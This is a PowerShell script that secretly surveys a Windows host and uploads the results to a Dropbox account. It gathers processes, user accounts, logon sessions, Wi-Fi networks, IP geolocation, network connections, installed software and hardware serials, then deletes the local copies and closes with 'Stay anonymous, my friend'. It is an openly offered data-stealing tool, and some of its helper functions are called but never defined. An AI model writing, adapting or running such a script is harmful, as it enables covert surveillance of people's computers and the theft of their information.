# Define Dropbox access token
$dropboxAccessToken = "token"

function Save-And-UploadInfo {
    param (
        [string]$info,
        [string]$fileName,
        [string]$accessToken
    )

    $tempPath = "$env:TEMP\$env:COMPUTERNAME-info"
    Ensure-DirectoryExists -directoryPath $tempPath
    $infoFilePath = "$tempPath\$fileName.txt"
    Save-InfoToFile -info $info -filePath $infoFilePath

    $dropboxFolderPath = "/$env:COMPUTERNAME-info"

    # Upload the file to Dropbox
    Upload-ToDropbox -filePath $infoFilePath -dropboxPath "$dropboxFolderPath/$fileName.txt" -accessToken $accessToken

    # Remove the local file after uploading
    Remove-Item -Path $infoFilePath
}

# Create temporary folder for local files
$computerName = $env:COMPUTERNAME
$localFolderPath = "$env:APPDATA\$computerName-info"
New-Item -ItemType Directory -Path $localFolderPath -Force | Out-Null

# Collect information about processes
$processInfo = Get-Process | Out-String
Save-And-UploadInfo -info $processInfo -fileName "ProcessInfo.txt" -accessToken $dropboxAccessToken

# Collect information about the system
$computerInfo = Get-ComputerInfo | Out-String
Save-And-UploadInfo -info $computerInfo -fileName "ComputerInfo.txt" -accessToken $dropboxAccessToken

# Collect information about browsers
$browserInfo = ""
$browsers = @("chrome", "firefox", "msedge")

foreach ($browser in $browsers) {
    $browserProcesses = Get-Process -Name $browser -ErrorAction SilentlyContinue
    if ($browserProcesses) {
        $browserInfo += "Info for ${browser}:`n"
        $browserInfo += $browserProcesses | Out-String
    } else {
        $browserInfo += "${browser} is not running.`n"
    }
}

Save-And-UploadInfo -info $browserInfo -fileName "BrowserInfo.txt" -accessToken $dropboxAccessToken

# Collect information about location and nearby Wi-Fi networks
$geoLocation = Get-Location | Out-String
$nearbyWifi = netsh wlan show networks mode=bssid | Out-String
$combinedWifiInfo = @"
$geoLocation

Nearby Wi-Fi Networks:
==================================================================
$nearbyWifi
"@

Save-And-UploadInfo -info $combinedWifiInfo -fileName "LocationAndWifiInfo.txt" -accessToken $dropboxAccessToken

# Collect geolocation information
$geolocation = (Invoke-WebRequest -Uri "https://ipinfo.io/json").Content | Out-String
Save-And-UploadInfo -info $geolocation -fileName "Geolocation.txt" -accessToken $dropboxAccessToken

# Collect more information about the operating system
$osInfo = @"
Operating System Information:
==================================================================
OS Name                        : $(Get-CimInstance Win32_OperatingSystem).Caption
OS Version                     : $(Get-CimInstance Win32_OperatingSystem).Version
Build Number                   : $(Get-CimInstance Win32_OperatingSystem).BuildNumber
Install Date                   : $(Get-CimInstance Win32_OperatingSystem).InstallDate
Last Boot Up Time              : $(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
Local Date Time                : $(Get-Date)
Current Time Zone              : $(Get-TimeZone).DisplayName
Country Code                   : $(Get-CimInstance Win32_OperatingSystem).CountryCode
OS Language                    : $(Get-CimInstance Win32_OperatingSystem).OSLanguage
Serial Number                  : $(Get-CimInstance Win32_OperatingSystem).SerialNumber
Windows Directory              : $(Get-CimInstance Win32_OperatingSystem).WindowsDirectory
System Directory               : $(Get-CimInstance Win32_OperatingSystem).SystemDirectory
Architecture                   : $(Get-CimInstance Win32_OperatingSystem).OSArchitecture
Service Pack Major Version     : $(Get-CimInstance Win32_OperatingSystem).ServicePackMajorVersion
Service Pack Minor Version     : $(Get-CimInstance Win32_OperatingSystem).ServicePackMinorVersion
Registered User                : $(Get-CimInstance Win32_OperatingSystem).RegisteredUser
Current Build Number           : $(Get-CimInstance Win32_OperatingSystem).CurrentBuildNumber
Install Date Format            : $(Get-CimInstance Win32_OperatingSystem).InstallDate | Get-Date -Format "yyyy-MM-dd HH:mm:ss"
"@

# Save more information about the operating system locally
Save-And-UploadInfo -info $osInfo -fileName "OSInfo.txt" -accessToken $dropboxAccessToken

# Collect information about local users
$localUsersInfo = @"
Local-user:
==================================================================
$(Get-CimInstance Win32_UserAccount | Select-Object Caption, Domain, Name, FullName, SID | Format-Table -AutoSize)
"@

# Save information about local users locally
Save-And-UploadInfo -info $localUsersInfo -fileName "LocalUsersInfo.txt" -accessToken $dropboxAccessToken

# Collect processor information
$cpuInfo = @"
CPU:
==================================================================
DeviceID      : $(Get-CimInstance Win32_Processor).DeviceID
Name          : $(Get-CimInstance Win32_Processor).Name
Caption       : $(Get-CimInstance Win32_Processor).Caption
Manufacturer  : $(Get-CimInstance Win32_Processor).Manufacturer
MaxClockSpeed : $(Get-CimInstance Win32_Processor).MaxClockSpeed
L2CacheSize   : $(Get-CimInstance Win32_Processor).L2CacheSize
L3CacheSize   : $(Get-CimInstance Win32_Processor).L3CacheSize
"@

# Save processor information locally
Save-And-UploadInfo -info $cpuInfo -fileName "CPUInfo.txt" -accessToken $dropboxAccessToken

# Collect more information about RAM
$ramInfo = @"
RAM Information:
==================================================================
Total RAM                      : $(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB GB
Available RAM                  : $(Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1GB GB
Device Locator                 : $(Get-CimInstance Win32_PhysicalMemory | Select-Object DeviceLocator, Capacity, @{Name="Capacity (GB)"; Expression={[string]::Format("{0:N2} GB", ($_.Capacity / 1GB))}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table -AutoSize)
Memory Form Factor             : $(Get-CimInstance Win32_PhysicalMemory).MemoryType
Memory Speed                   : $(Get-CimInstance Win32_PhysicalMemory).Speed
Memory Manufacturer            : $(Get-CimInstance Win32_PhysicalMemory).Manufacturer
"@

# Save more information about RAM locally
Save-And-UploadInfo -info $ramInfo -fileName "RAMInfo.txt" -accessToken $dropboxAccessToken

# Collect information about the motherboard
$mainboardInfo = @"
Motherboard Information:
Manufacturer: $(Get-CimInstance Win32_BaseBoard).Manufacturer
Model: $(Get-CimInstance Win32_BaseBoard).Product
Name: $(Get-CimInstance Win32_BaseBoard).Name
Serial Number: $(Get-CimInstance Win32_BaseBoard).SerialNumber
Caption: $(Get-CimInstance Win32_BaseBoard).Caption
Status: $(Get-CimInstance Win32_BaseBoard).Status
Product: $(Get-CimInstance Win32_BaseBoard).Product
"@

# Save information about the motherboard locally
Save-And-UploadInfo -info $mainboardInfo -fileName "MainboardInfo.txt" -accessToken $dropboxAccessToken

# Collect BIOS information
$biosInfo = @"
SMBIOSBIOSVersion : $(Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion
Manufacturer : $(Get-CimInstance Win32_BIOS).Manufacturer
Name : $(Get-CimInstance Win32_BIOS).Name
SerialNumber : $(Get-CimInstance Win32_BIOS).SerialNumber
Version : $(Get-CimInstance Win32_BIOS).Version
"@

# Save BIOS information locally
Save-And-UploadInfo -info $biosInfo -fileName "BiosInfo.txt" -accessToken $dropboxAccessToken

# Collect information about hard disk drives
$hddInfo = @"
Hard Disk Drives:
$(Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, VolumeName, DriveType, FileSystem, VolumeSerialNumber, @{Name="Total Size (GB)"; Expression={[math]::Round($_.Size / 1GB, 2)}}, @{Name="Free Space (GB)"; Expression={[math]::Round($_.FreeSpace / 1GB, 2)}}, @{Name="Free Space (%)"; Expression={[math]::Round(($_.FreeSpace / $_.Size) * 100, 2)}} | Format-Table -AutoSize)
"@

# Save information about hard disk drives locally
Save-And-UploadInfo -info $hddInfo -fileName "HDDsInfo.txt" -accessToken $dropboxAccessToken

# Collect information about COM and serial devices
$comDevices = Get-WmiObject Win32_PnPEntity | Where-Object {$_.PNPClass -eq "Ports"} | Out-String
Save-And-UploadInfo -info $comDevices -fileName "COMDevices.txt" -accessToken $dropboxAccessToken

# Collect information about current location
$geoLocation = Get-Location | Out-String
Save-And-UploadInfo -info $geoLocation -fileName "GeoLocation.txt" -accessToken $dropboxAccessToken

# Collect information about current user sessions
$userSessions = Get-WmiObject Win32_LogonSession | Where-Object { $_.LogonType -eq 2 } | Select-Object StartTime, EndTime, UserName | Out-String
Save-And-UploadInfo -info $userSessions -fileName "UserSessions.txt" -accessToken $dropboxAccessToken

# Collect information about current network connections
$networkConnections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Out-String
Save-And-UploadInfo -info $networkConnections -fileName "NetworkConnections.txt" -accessToken $dropboxAccessToken

# Collect information about current network connections using netstat
$netstatInfo = Get-NetTCPConnection | Out-String
Save-And-UploadInfo -info $netstatInfo -fileName "NetstatInfo.txt" -accessToken $dropboxAccessToken

# Collect information about listeners
$listenersInfo = Get-NetTCPListener | Select-Object LocalAddress, LocalPort, State | Out-String
Save-And-UploadInfo -info $listenersInfo -fileName "ListenersInfo.txt" -accessToken $dropboxAccessToken

# Collect more information about installed software
$installedSoftwareInfo = @"
Installed Software:
$(Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor | Format-Table -AutoSize)
"@

# Save more information about installed software locally
Save-And-UploadInfo -info $installedSoftwareInfo -fileName "InstalledSoftwareInfo.txt" -accessToken $dropboxAccessToken

# Collect information about RAM
$ramInfo = @"
RAM:
TotalCapacity: $(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB GB
AvailableCapacity: $(Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1GB GB

MemoryModules:
$(Get-CimInstance Win32_PhysicalMemory | Select-Object DeviceLocator, Manufacturer, PartNumber, Capacity | Format-Table -AutoSize)
"@

# Save information about RAM locally
Save-And-UploadInfo -info $ramInfo -fileName "RAMInfo-more-info.txt" -accessToken $dropboxAccessToken

# Collect information about hard disk drives
$hddInfo = @"
HDDs:
$(Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{Name="Capacity GB"; Expression={[math]::Round($_.Size / 1GB, 2)}}, @{Name="FreeSpace GB"; Expression={[math]::Round($_.FreeSpace / 1GB, 2)}}, @{Name="UsedSpace GB"; Expression={[math]::Round(($_.Size - $_.FreeSpace) / 1GB, 2)}}, @{Name="UsedSpace %"; Expression={[math]::Round((($_.Size - $_.FreeSpace) / $_.Size) * 100, 2)}} | Format-Table -AutoSize)
"@

# Save information about hard disk drives locally
Save-And-UploadInfo -info $hddInfo -fileName "HDDsInfo.txt" -accessToken $dropboxAccessToken

# Collect information about the motherboard
$mainboardInfo = @"
Mainboard:
Manufacturer : $(Get-CimInstance Win32_BaseBoard).Manufacturer
Model : $(Get-CimInstance Win32_BaseBoard).Product
SerialNumber : $(Get-CimInstance Win32_BaseBoard).SerialNumber
SupportedCPUs: $(Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name | Get-Unique -AsString)
MemorySlots : $(Get-CimInstance Win32_PhysicalMemoryArray).MemoryDevices
"@

# Save information about the motherboard locally
Save-And-UploadInfo -info $mainboardInfo -fileName "MainboardInfo-more-info.txt" -accessToken $dropboxAccessToken

# Generate a unique folder name
$timestamp = Get-Date -Format "yyyyMMddHHmmss"
$folderName = "$computerName-info_$timestamp"
$dropboxFolderPath = "/$folderName"

# Copy the local folder to a temporary location
$tempFolderPath = "$env:TEMP\$folderName"
Copy-Item -Path $localFolderPath -Destination $tempFolderPath -Recurse

# Create a folder on Dropbox
$headers= @{
    "Authorization" = "Bearer $dropboxAccessToken"
    "Content-Type" = "application/json"
}

$body = @{
    "path" = $dropboxFolderPath
    "autorename" = $true
    "mute" = $false
    "mode" = "add"
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $body

# Upload the contents of the local folder to Dropbox
Get-ChildItem $localFolderPath | ForEach-Object {
    $fileName = $_.Name
    $localFilePath = $_.FullName
    $headers = @{
        "Authorization" = "Bearer $dropboxAccessToken"
        "Dropbox-API-Arg" = "{""path"":""$dropboxFolderPath/$fileName""}"
        "Content-Type" = "application/octet-stream"
    }

    $fileContent = Get-Content $localFilePath -Raw
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileContent
}

Write-Output "Collection of information"
Start-Sleep -Seconds 2

Write-Output "Start collecting information"
Start-Sleep -Seconds 2

Write-Output "Start sending information"
Start-Sleep -Seconds 2

Write-Output "Send to Dropbox"
Start-Sleep -Seconds 2

# Remove the temporary folder
Remove-Item $tempFolderPath -Recurse -Force
Write-Output "Stay anonymous, my friend"
Start-Sleep -Seconds 2
Remove-Item $tempFolderPath -Recurse -Force

